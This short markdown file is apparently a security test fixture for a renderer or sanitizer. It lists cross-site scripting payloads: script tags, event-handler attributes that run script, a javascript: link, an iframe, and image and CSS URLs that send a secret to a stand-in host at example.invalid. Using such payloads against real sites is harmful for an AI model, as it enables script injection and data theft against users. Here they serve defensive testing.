# Security fixture

<script>globalThis.__markherePwned = true</script>
<img src="https://example.invalid/tracker?secret=UNIQUE_SECRET" onerror="globalThis.__markherePwned=true">
<a href="javascript:alert(document.domain)">bad link</a>
<iframe src="https://example.invalid"></iframe>
<form action="https://example.invalid"><input autofocus onfocus="alert(1)"></form>
<div style="background:url(https://example.invalid/exfil)">styled</div>
